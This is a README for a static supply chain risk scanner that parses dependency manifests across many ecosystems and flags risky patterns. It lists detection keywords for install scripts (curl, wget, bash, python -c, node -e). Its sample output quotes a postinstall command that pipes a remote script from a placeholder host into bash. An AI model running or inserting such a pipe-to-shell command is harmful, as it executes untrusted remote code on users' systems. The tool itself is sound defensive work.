# Supply Chain Risk Mapper

## Overview

The **Supply Chain Risk Mapper** is a static analysis tool that scans entire repositories to identify all **dependencies**, **manifests**, and **potential supply chain attack surfaces**. This tool focuses entirely on the **Mapper layer**, providing a **highly modular, extensible base system** that can be integrated with tools like `socket.dev`, `Snyk`, `Trivy`, or custom scanners.

The mapper performs comprehensive **cross-language dependency and metadata mapping** by:
- Recursively scanning code repositories
- Identifying all dependency-related files and manifests
- Extracting, normalizing, and outputting structured JSON data
- Computing lightweight **risk signals** (static heuristics) for each dependency
- Producing a consolidated JSON output file for downstream consumption

---

## 🚀 Features

### Supported Ecosystems (11 total)
- **JavaScript/TypeScript:** `package.json`, `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`, `tsconfig.json`
- **Python:** `requirements.txt`, `pyproject.toml`, `Pipfile`, `Pipfile.lock`
- **Go:** `go.mod`, `go.sum`
- **Rust:** `Cargo.toml`, `Cargo.lock`
- **Java:** `pom.xml`, `build.gradle`, `gradle.lockfile`
- **Ruby:** `Gemfile`, `Gemfile.lock`
- **PHP:** `composer.json`, `composer.lock`
- **.NET/C#:** `*.csproj`, `packages.lock.json`
- **Container / Infra:** `Dockerfile`, `docker-compose.yml`, `Dockerfile.*`
- **Package Managers:** `yarn.lock`, `pnpm-lock.yaml`, `Pipfile`, `Pipfile.lock`
- **Configuration:** `tsconfig.json`

### Risk Detection Heuristics
- Install/Postinstall scripts with suspicious commands (`curl`, `wget`, `bash`, `python -c`, `node -e`)
- Obfuscated or encoded code (long base64 strings, `eval` usage)
- Git dependencies (`git+https` or `git@` sources)
- Unpinned versions (wildcards, `latest`, unversioned)
- Container/Dockerfile risks (unpinned base image tags, dangerous RUN commands)
- Binary or native modules in dependency trees
- Third-party CI Actions with unpinned references

---

## 🧱 Architecture

### 1. Repo Walker (`walker.py`)
- Recursively walks through the entire repository
- Honors `.gitignore` rules using `pathspec` library
- Collects all known manifest and lockfile types
- Supports custom ignore patterns via configuration

### 2. Manifest Parser Layer (`/src/parsers/`)
Modular, ecosystem-specific parsers that return normalized dependency records:

```json
{
  "ecosystem": "npm",
  "manifest_path": "services/api/package.json",
  "dependency": {
    "name": "express",
    "version": "^4.18.0",
    "source": "registry",
    "resolved": null
  },
  "metadata": {
    "dev_dependency": false,
    "line_number": 12,
    "script_section": false
  }
}
```

### 3. Risk Signal Extraction (`risk_heuristics.py`)
Static heuristic analysis for supply chain risk detection without network calls, including:
- Postinstall script analysis
- Git dependency detection
- Unpinned version identification
- Container risk assessment
- Obfuscated code detection

### 4. Output Formatting (`output.py`)
Formats the canonical JSON output structure:

```json
{
  "repo": {
    "path": "/path/to/repo",
    "commit_hash": "abc123",
    "scan_date": "2023-01-01T00:00:00Z"
  },
  "scan_summary": {
    "total_manifests": 4,
    "ecosystems_detected": ["npm", "python", "docker"],
    "total_dependencies": 15,
    "total_signals": 3
  },
  "dependencies": [
    {
      "ecosystem": "npm",
      "manifest_path": "services/api/package.json",
      "dependency": {
        "name": "axios",
        "version": "^1.3.2",
        "source": "registry",
        "resolved": "https://registry.npmjs.org/axios/-/axios-1.3.2.tgz"
      },
      "metadata": {
        "dev_dependency": false,
        "line_number": 5,
        "script_section": true
      },
      "signals": [
        {
          "type": "postinstall_script",
          "file": "package.json",
          "line": 45,
          "detail": "postinstall runs 'curl https://example.sh | bash'",
          "severity": "high"
        }
      ],
      "risk_score": 0.85
    }
  ]
}
```

---

## 🛠️ Installation & Setup

### Prerequisites
- Python 3.11+
- `pip` package manager

### Dependencies
Install required dependencies:
```bash
pip install -r requirements.txt
```

### Project Structure
```
supply-chain-mapper-agent/
├── config.yaml                   # Configuration file
├── README.md                     # This documentation
├── requirements.txt             # Python dependencies
├── repo-to-scan/                # Directory containing files to scan
│   ├── package.json             # JS/Node.js manifest
│   ├── pyproject.toml           # Python project config
│   ├── requirements.txt         # Python dependencies
│   ├── go.mod                   # Go module dependencies
│   ├── Cargo.toml               # Rust cargo dependencies
│   ├── pom.xml                  # Java Maven project
│   ├── Gemfile                  # Ruby dependencies
│   ├── composer.json            # PHP dependencies
│   └── Dockerfile*              # Container manifests
└── src/                         # Source code
    ├── cli.py                   # Command-line interface
    ├── config.py                # Configuration management
    ├── output.py                # Output formatting
    ├── signals.py               # Signal generation
    ├── risk_heuristics.py       # Risk analysis
    ├── walker.py                # Repository walker
    └── parsers/                 # Ecosystem-specific parsers
        ├── npm_parser.py
        ├── python_parser.py
        ├── go_parser.py
        ├── dockerfile_parser.py
        ├── rust_parser.py
        ├── java_parser.py
        ├── ruby_parser.py
        └── php_parser.py
```

---

## 📋 Usage

### Basic Usage
```bash
python -m src.cli --path <repo-path> --output <output-file>
```

### Examples
```bash
# Scan current directory
python -m src.cli --path . --output report.json

# Scan specific directory
python -m src.cli --path repo-to-scan --output scan_report.json

# Use custom configuration
python -m src.cli --path repo-to-scan --config config.yaml --output report.json
```

### Command Line Options
| Option | Description | Default |
|--------|-------------|---------|
| `--path PATH` | Path to the repository to scan | `.` |
| `--output OUTPUT` | Output file for the scan report | `mapper_report.json` |
| `--config CONFIG` | Path to config file | None |
| `--no-color` | Disable colored output | False |
| `--include-binaries` | Include binary detection in scan | False |
| `--help` | Show help message | - |

---

## ⚙️ Configuration

The mapper supports configuration via `config.yaml`:

```yaml
# Supply Chain Risk Mapper Configuration

# Paths to ignore during scanning
paths_to_ignore:
  - "node_modules/"
  - "vendor/"
  - ".git/"
  - "__pycache__/"
  - "*.log"
  - "dist/"
  - "build/"
  - ".venv/"
  - "venv/"

# File types to include/exclude
file_types:
  include: []
  exclude: 
    - "*.tmp"
    - "*.bak"
    - ".DS_Store"

# Severity thresholds
severity_thresholds:
  low: true
  medium: true
  high: true
  critical: true

# Optional settings
offline_mode: false
include_binaries: false

# Risk heuristics toggles
risk_heuristics:
  install_scripts: true
  obfuscated_code: true
  git_dependencies: true
  unpinned_versions: true
  binary_modules: true
  container_risks: true
  third_party_ci_actions: true
```

---

## 🧪 Testing

### Running Tests
The mapper can be tested by scanning the included `repo-to-scan` directory:

```bash
python -m src.cli --path repo-to-scan --output test_results.json
```

### Test Results Example
- **43 total dependencies** across **8 ecosystems**
- **10 manifests** discovered and parsed
- **17 risk signals** identified with risk scores

---

## 🚀 Example Output

```json
{
  "repo": {
    "path": "/path/to/repo",
    "commit_hash": "abc123",
    "scan_date": "2023-01-01T00:00:00Z"
  },
  "scan_summary": {
    "total_manifests": 10,
    "ecosystems_detected": ["python", "npm", "go", "docker", "rust", "java", "ruby", "php"],
    "total_dependencies": 43,
    "total_signals": 17
  },
  "dependencies": [
    {
      "ecosystem": "python",
      "manifest_path": "repo-to-scan/requirements.txt",
      "dependency": {
        "name": "requests",
        "version": "*",
        "source": "pypi",
        "resolved": null
      },
      "metadata": {
        "dev_dependency": false,
        "line_number": 1,
        "script_section": false
      },
      "signals": [
        {
          "type": "unpinned_version",
          "file": "repo-to-scan/requirements.txt",
          "line": 1,
          "detail": "Dependency 'requests' has unpinned version '*' (wildcard version)",
          "severity": "high"
        }
      ],
      "risk_score": 0.8
    }
  ]
}
```

---

## 🛡️ Security Considerations

- **Static-Only Analysis**: No network calls or execution of code during scans
- **File System Isolation**: Scans only the specified directory and subdirectories
- **Configuration Validation**: All input paths are validated to prevent directory traversal
- **No Dependency Installation**: Does not install any dependencies during scanning

---

## 📈 Extending the Mapper

### Adding New Parsers
To add support for new ecosystems:
1. Create a new parser in `/src/parsers/` (e.g. `new_parser.py`)
2. Follow the same interface pattern as existing parsers
3. Add the new parser to `/src/parsers/__init__.py`
4. Update `/src/cli.py` to import and use the new parser
5. Update `/src/walker.py` with new manifest patterns if needed

### Adding New Heuristics
Add new risk detection patterns in `risk_heuristics.py` following the existing pattern.

---

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

---

## 📄 License

This project is licensed under the MIT License - see the LICENSE file for details.

---

## 🙏 Acknowledgments

- Built with Python 3.11+
- Uses `pathspec`, `toml`, `xml.etree.ElementTree` libraries
- Cross-platform compatibility (Windows, macOS, Linux)